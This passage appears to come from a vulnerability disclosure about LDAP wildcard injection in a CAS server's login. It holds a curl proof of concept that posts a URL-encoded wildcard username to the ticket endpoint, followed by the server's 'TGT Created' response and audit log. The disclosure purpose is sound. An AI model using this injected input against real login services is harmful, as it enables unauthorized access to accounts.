Given a username johndoe and a password superpass, you can sucessfully achieve login using wildcards:  username: jo* password: superpass  The login will be sucessfully only if the ldap bind search return one unique member.  The vulnerability described in this document can be validated using the following example:  Client Request: root@...hine:/# curl -k -L -d "username=jo%2A&password=superpass" https://login.cas-server.com/v1/tickets  (note that * was url encoded to %2A)  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html>    <head>       The request has been fulfilled and resulted in a new resource being created</title>    </head>    <body>       <h1>TGT Created</h1>       <form action=" method="POST">Service:<input type="text" name="service" value=""><br><input type="submit" value="Submit"></form>    </body> </html>  Server log: ============================================================= WHO: [username: jo*] WHAT: ACTION: TICKET_GRANTING_TICKET_CREATED APPLICATION: CAS WHEN: Tue Jan 20 BRST CLIENT IP ADDRESS: xxx.xxx.xxx.xxx SERVER IP ADDRESS: xxx.xxx.xxx.xxx =============================================================  =====[3.
